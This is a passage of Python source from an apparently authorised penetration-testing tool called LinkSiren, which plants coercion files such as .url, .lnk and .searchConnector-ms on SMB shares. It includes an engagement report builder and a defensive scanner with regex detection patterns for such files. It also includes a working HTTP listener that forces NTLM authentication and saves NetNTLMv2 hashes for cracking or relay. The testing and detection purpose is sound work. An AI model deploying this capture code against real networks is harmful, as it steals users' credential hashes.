            host = line[2:].split("\\", 1)[0]
            written_by_host[host] += 1

    lines = []
    lines.append("# LinkSiren Engagement Report")
    lines.append("")
    if events:
        first = events[0].get("Timestamp", "?")
        last = events[-1].get("Timestamp", "?")
        lines.append(f"_Events in `{log_path}`: {first} ... {last}_")
        lines.append("")

    lines.append("## Summary")
    lines.append("")
    lines.append(f"- Payloads written: **{len(written)}** across **{len(written_by_host)}** host(s)")
    lines.append(f"- Hosts that received `--encrypt` payloads: **{len(encrypt_hosts)}**")
    lines.append(f"- Hosts where EFS was confirmed-Stopped before deploy: **{len(efs_started_by_us)}**")
    lines.append(f"- Payloads cleanup could NOT delete: **{len(not_deleted)}**")
    lines.append(f"- Detect findings (this run): **{len(detect_lines)}**")
    lines.append(f"- Coercion captures recorded: **{len(capture_lines)}**")
    lines.append("")
    if levels:
        lines.append("### Log levels")
        lines.append("")
        for lvl in ("CRITICAL", "ERROR", "WARNING", "INFO", "DEBUG"):
            if levels.get(lvl):
                lines.append(f"- {lvl}: {levels[lvl]}")
        lines.append("")

    if written_by_host:
        lines.append("## Payloads written per host")
        lines.append("")
        for host, n in sorted(written_by_host.items()):
            lines.append(f"- `\\\\{host}`: {n}")
        lines.append("")

    if encrypt_hosts:
        lines.append("## Hosts where `--encrypt` fired")
        lines.append("")
        for h in encrypt_hosts:
            sidecar_note = " (EFS was Stopped pre-deploy; eligible for cleanup --stop-efs)" \
                if h in efs_started_by_us else " (EFS was already Running pre-deploy)"
            lines.append(f"- `{h}`{sidecar_note}")
        lines.append("")

    if not_deleted:
        lines.append("## ⚠ Payloads NOT deleted by cleanup (engagement artifacts)")
        lines.append("")
        for p in not_deleted:
            lines.append(f"- `{p}`")
        lines.append("")

    if capture_lines:
        lines.append("## Captured coercion auth events")
        lines.append("")
        lines.append("From `coerce_captures.log` (most recent first, truncated to 50):")
        lines.append("")
        lines.append("```")
        for ln in capture_lines[-50:]:
            lines.append(ln)
        lines.append("```")
        lines.append("")

    if detect_lines:
        lines.append("## Detect findings")
        lines.append("")
        lines.append("From `detect_findings.txt`:")
        lines.append("")
        lines.append("```")
        for ln in detect_lines[:50]:
            lines.append(ln)
        lines.append("```")
        lines.append("")

    Path(output_path).write_text("\n".join(lines), encoding="utf-8")
    info_print(
        f"report: wrote {output_path} "
        f"({len(written)} writes, {len(encrypt_hosts)} encrypt hosts, "
        f"{len(not_deleted)} leftovers, {len(capture_lines)} captures)",
        file=sys.stderr,
    )


def handle_detect(args, credentials):
    """Blue-team scanner for coercion-style files.

    Walks each target folder up to ``--max-depth`` and inspects:
      * ``.url`` files for ``URL=http://...`` or ``IconFile=\\\\<host>\\``
      * ``.lnk`` files for embedded ``\\\\<host>\\`` UNCs in the icon /
        target name path (best-effort raw scan, no full lnk parse)
      * ``.searchConnector-ms`` / ``.library-ms`` for ``<url>`` elements
        pointing at http or \\\\ UNC

    Each finding is reported with the UNC path of the file, the extracted
    referenced host(s), and a one-word signature. With
    ``--include-host-allowlist``, findings that ONLY reference allowed
    hosts log at INFO rather than WARNING.
    """
    import re

    logger = logging.getLogger("main_logger")
    targets = read_targets(args.targets)
    max_depth = int(getattr(args, "max_depth", 4) or 4)
    output_path = getattr(args, "output", "detect_findings.txt")
    allowlist = set()
    if getattr(args, "include_host_allowlist", None):
        with open(args.include_host_allowlist, encoding="utf-8") as f:
            for ln in f:
                ln = ln.strip().lower()
                if ln and not ln.startswith("#"):
                    allowlist.add(ln)

    PAT_URL = re.compile(r"^URL=(\S+)", re.MULTILINE | re.IGNORECASE)
    PAT_ICONFILE = re.compile(r"^IconFile=(\\\\[^\r\n]+)", re.MULTILINE | re.IGNORECASE)
    PAT_XML_URL = re.compile(r"<url>([^<]+)</url>", re.IGNORECASE)
    PAT_UNC = re.compile(rb"\\\\([A-Za-z0-9._-]{1,255})\\")

    findings = []

    def _scan_text(content: str, ext: str, unc_path: str):
        hits = []
        if ext == ".url":
            for m in PAT_URL.finditer(content):
                hits.append(("url-URL", m.group(1)))
            for m in PAT_ICONFILE.finditer(content):
                hits.append(("url-IconFile-UNC", m.group(1)))
        elif ext in (".library-ms", ".searchConnector-ms"):
            for m in PAT_XML_URL.finditer(content):
                v = m.group(1)
                if v.startswith("http://") or v.startswith("https://") or v.startswith("\\\\"):
                    hits.append(("xml-simpleLocation", v))
        return hits

    def _scan_binary(content: bytes, ext: str, unc_path: str):
        hits = []
        if ext == ".lnk":
            # Find raw UNC patterns (\\<host>\) in the binary content.
            for m in PAT_UNC.finditer(content):
                hits.append(("lnk-UNC-ref", "\\\\" + m.group(1).decode("latin1") + "\\..."))
        return hits

    def _host_of(ref: str) -> str | None:
        if ref.startswith("http://") or ref.startswith("https://"):
            try:
                from urllib.parse import urlparse
                return urlparse(ref).hostname or None
            except Exception:
                return None
        if ref.startswith("\\\\"):
            parts = ref[2:].split("\\", 1)
            return parts[0] if parts else None
        return None

    INTERESTING_EXTS = {".url", ".lnk", ".library-ms", ".searchConnector-ms"}

    def _walk(target, share: str, folder: str, depth: int):
        if depth < 0:
            return
        try:
            listings = target.connection.listPath(shareName=share, path=f"{folder}\\*")
        except Exception as e:
            logger.debug(
                "detect: cannot list %s\\%s: %s", share, folder, e,
                extra={"path": f"\\\\{target.host}\\{share}\\{folder}"},
            )
            return
        for entry in listings:
            name = entry.get_longname()
            if name in (".", ".."):
                continue
            sub = f"{folder}\\{name}" if folder else name
            if entry.is_directory():
                _walk(target, share, sub, depth - 1)
                continue
            ext = ""
            for e in INTERESTING_EXTS:
                if name.lower().endswith(e.lower()):
                    ext = e
                    break
            if not ext:
                continue
            # Read the file
            try:
                fh = target.connection.openFile(
                    target.connection.connectTree(share), sub,
                )
                size = entry.get_filesize()
                data = target.connection.readFile(
                    target.connection.connectTree(share), fh, 0, min(size, 1024 * 1024),
                )
                target.connection.closeFile(target.connection.connectTree(share), fh)
            except Exception as e:
                logger.debug(
                    "detect: cannot read %s\\%s: %s", share, sub, e,
                    extra={"path": f"\\\\{target.host}\\{share}\\{sub}"},
                )
                continue
            unc_path = f"\\\\{target.host}\\{share}\\{sub}"
            if ext == ".lnk":
                hits = _scan_binary(data, ext, unc_path)
            else:
                try:
                    txt = data.decode("utf-8", errors="replace")
                except Exception:
                    txt = ""
                hits = _scan_text(txt, ext, unc_path)
            for sig, ref in hits:
                host = _host_of(ref)
                in_allow = host and host.lower() in allowlist
                findings.append({
                    "unc": unc_path, "signature": sig, "ref": ref,
                    "host": host, "in_allowlist": bool(in_allow),
                })
                level = logger.info if in_allow else logger.warning
                level(
                    "detect: %s file %s references %s",
                    sig, unc_path, ref,
                    extra={"path": unc_path},
                )

    for target in targets:
        target.connect(credentials)
        if target.connection is None:
            logger.warning(
                "detect: could not connect", extra={"path": f"\\\\{target.host}"},
            )
            continue
        target.expand_paths()
        for path in target.paths:
            share = path.split("\\")[0]
            folder = "\\".join(path.split("\\")[1:])
            _walk(target, share, folder, max_depth)

    # Write findings file (tab-separated)
    with open(output_path, "w", encoding="utf-8") as f:
        for fnd in findings:
            f.write(
                f"{fnd['unc']}\t{fnd['signature']}\t{fnd['ref']}\t"
                f"{fnd['host'] or ''}\t{'ALLOW' if fnd['in_allowlist'] else 'WARN'}\n"
            )

    if getattr(args, "json_output", False):
        print(json.dumps({"mode": "detect", "findings": findings}))
    else:
        warn_count = sum(1 for f in findings if not f["in_allowlist"])
        info_print(
            f"detect: {len(findings)} finding(s) ({warn_count} non-allowlisted) "
            f"written to {output_path}",
            file=sys.stderr,
        )


def handle_listen(args):
    """Lightweight confirmation listener.

    Runs an HTTP server that accepts and logs:
      * GET / PROPFIND / OPTIONS requests
      * NTLM negotiation: sends a 401 challenge, captures both Type-1 and
        Type-3 messages (NetNTLMv2 lives in Type-3)

    Writes one line per request to ``args.output`` and, when
    ``args.blobs_dir`` is set, writes any Type-3 blob to its own file
    so the tester can hand off to hashcat / ntlmrelayx out of band.
    Not a Responder replacement; this is a confirmation-only signal
    that a coercion attempt actually fired.
    """
    import base64
    import http.server
    import socketserver
    import threading
    import time
    import os

    captures_path = args.output
    blobs_dir = args.blobs_dir

    if blobs_dir:
        os.makedirs(blobs_dir, exist_ok=True)

    log_lock = threading.Lock()

    def _emit(line: str):
        ts = time.strftime("%Y-%m-%dT%H:%M:%S")
        with log_lock:
            with open(captures_path, "a", encoding="utf-8") as f:
                f.write(f"{ts} {line}\n")
            info_print(f"{ts} {line}", file=sys.stderr)

    class _Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self): self._handle()
        def do_PROPFIND(self): self._handle()
        def do_OPTIONS(self): self._handle()
        def do_HEAD(self): self._handle()

        def _handle(self):
            src = self.client_address[0]
            ua = self.headers.get("User-Agent", "?")
            auth = self.headers.get("Authorization", "")
            cmd = self.command
            path = self.path
            if not auth:
                _emit(f"{cmd} {path} from {src} UA={ua!r} no-auth")
                self.send_response(401)
                self.send_header("WWW-Authenticate", "NTLM")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            if not auth.startswith("NTLM "):
                _emit(f"{cmd} {path} from {src} UA={ua!r} other-auth={auth[:40]!r}")
                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            blob_b64 = auth[5:].strip()
            try:
                raw = base64.b64decode(blob_b64)
            except Exception:
                raw = b""
            msg_type = raw[8] if len(raw) > 8 else 0
            label = {1: "Type-1 Negotiate", 2: "Type-2 Challenge",
                     3: "Type-3 NetNTLMv2"}.get(msg_type, f"Type-{msg_type}")
            _emit(
                f"{cmd} {path} from {src} UA={ua!r} NTLMSSP {label} "
                f"({len(raw)} bytes) blob={blob_b64}"
            )
            if msg_type == 3 and blobs_dir:
                fname = f"{int(time.time())}_{src.replace(':', '_')}.ntlmssp.bin"
                fpath = os.path.join(blobs_dir, fname)
                with open(fpath, "wb") as f:
                    f.write(raw)
                _emit(f"  -> Type-3 blob saved to {fpath}")
            if msg_type == 1:
                # Provide a Type-2 so the client sends Type-3.
                challenge = base64.b64encode(
                    b"NTLMSSP\x00\x02\x00\x00\x00"
                    b"\x00\x00\x00\x00\x00\x00\x00\x00"
                    b"\x05\x82\x89\x02"
                    b"\x11\x22\x33\x44\x55\x66\x77\x88"
                    b"\x00\x00\x00\x00\x00\x00\x00\x00"
                    b"\x00\x00\x00\x00\x00\x00\x00\x00"
                ).decode()
                self.send_response(401)
                self.send_header("WWW-Authenticate", f"NTLM {challenge}")
                self.send_header("Content-Length", "0")
                self.end_headers()
            else:
                self.send_response(200)
                self.send_header("Content-Length", "0")
                self.end_headers()

        def log_message(self, *a, **kw):
            pass  # we do our own logging

    class _Reusable(socketserver.ThreadingTCPServer):
        allow_reuse_address = True
        daemon_threads = True

    with _Reusable((args.bind, args.port), _Handler) as srv:
        info_print(
            f"listen: bound on {args.bind}:{args.port}; captures -> "
            f"{captures_path}"
            + (f"; Type-3 blobs -> {blobs_dir}/" if blobs_dir else ""),
            file=sys.stderr,
        )
        if args.timeout and args.timeout > 0:
            t = threading.Thread(target=srv.shutdown, daemon=True)
            timer = threading.Timer(args.timeout, srv.shutdown)
            timer.daemon = True
            timer.start()
            try:
                srv.serve_forever()
            finally:
                timer.cancel()
        else:
            try:
                srv.serve_forever()
            except KeyboardInterrupt:
                info_print("listen: interrupted, exiting.", file=sys.stderr)


def _fmt_running(v):
    """Compact 3-way running indicator for the check report."""
    return {True: "running", False: "stopped", None: "unknown"}[v]


